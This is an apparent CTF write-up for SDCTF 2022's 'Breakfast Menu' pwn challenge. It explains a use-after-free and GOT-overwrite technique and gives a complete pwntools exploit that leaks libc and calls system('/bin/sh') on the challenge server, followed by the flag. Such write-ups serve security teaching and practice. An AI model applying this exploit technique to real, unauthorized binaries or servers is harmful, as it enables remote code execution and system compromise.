---
title: "[Pwn] Breakfast Menu [SDCTF 2022]"
date: 2022-05-09 18:51:00
---

# 0x0 Introduction

Medium

I’m awfully hungry, with all these options to choose from, what should I order?

Connect

nc breakfast.sdc.tf 1337

By green beans

files: [BreakfastMenu](BreakfastMenu)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

In short, binary have a Use-After-Free (UAF) vulnerability. Allow us to edit the heap after we free the heap. 

Moreover, the dangling pointers are global variable. Therefore we can utilze the single linked list in heap and do a write on the address we want.

The basic idea of this challenge is first replace `free` with `puts` to leak libc address, then replace `free` with `system`, call `system("/bin/sh")` to get shell

1. malloc malloc free free to create a single linked list in heap
2. edit obj.orders[1], write address of obj.orders in it
3. malloc malloc. now obj.orders[2] point to a heap, obj.order.[3] point to obj.orders[0]
4. edit order[2], write `/bin/sh\x00` into the heap
5. edit order[3] to got.free => obj.orders[0] will change to got.free
6. edit obj.orders[0] to got.puts, this replace function `free` with function `puts`
7. edit obj.orders[3] to got.printf
8. free(obj.orders[0]) this will call puts(got.printf) and leak libc address
9. edit obj.orders[3] to got.free, then edit obj.orders[0], replace `free` with `system`
10. free(obj.orders[2]), this will call `system("/bin/sh")` and give us a shell.

# 0x3 Exploit

```python
from pwn import *

exe = ELF("BreakfastMenu_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("breakfast.sdc.tf", 1337)
    return r


io = start()

# make one heap pointer point to obj.orders
io.sendlineafter(b"leave\n",b'1')
io.sendlineafter(b"leave\n",b'1')

io.sendlineafter(b"leave\n",b'3')
io.sendlineafter(b"remove\n",b'0')

io.sendlineafter(b"leave\n",b'3')
io.sendlineafter(b"remove\n",b'1')

print("got.free, got.puts",hex(exe.got["free"]))

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'1')
io.sendlineafter(b"order?\n",flat([exe.symbols["orders"]]))

io.sendlineafter(b"leave\n",b'1')
io.sendlineafter(b"leave\n",b'1')

# obj.orders[0] = exe.got["free"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'2')
io.sendlineafter(b"order?\n",b"/bin/sh\x00")

# obj.orders[0] = exe.got["free"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'3')
io.sendlineafter(b"order?\n",flat([exe.got["free"]]))

# exe.got["free"] = exe.sym["puts"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'0')
io.sendlineafter(b"order?\n",flat([b'AAAAA\x00']))

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'0')
io.sendlineafter(b"order?\n",flat([b'AAAA\x00']))

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'0')
io.sendlineafter(b"order?\n",flat([exe.sym["puts"]]))

# obj.orders[0] = exe.got["printf"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'3')
io.sendlineafter(b"order?\n",flat([exe.got["printf"]]))

# free(obj.orders[0]) => puts(obj.orders[0])

io.sendlineafter(b"leave\n",b'3')
io.sendlineafter(b"remove\n",b'0')
libc.address = int.from_bytes(io.recvuntil(b'\n1. ',drop=True),"little") - libc.sym["printf"]
print("libc leak",hex(libc.address))

# obj.orders[0] = exe.got["free"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'3')
io.sendlineafter(b"order?\n",flat([exe.got["free"]]))

# exe.got["free"] = libc.sym["system"]
io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'0')
io.sendlineafter(b"order?\n",flat([libc.sym["system"]]))

# free(obj.orders[2]) => system("/bin/sh")

io.sendlineafter(b"leave\n",b'3')
io.sendlineafter(b"remove\n",b'2')
io.interactive()

```

# 0x4 Flag

sdctf{Th3_m05t_1Mp0Rt4nT_m34L_0f_th3_d4Y}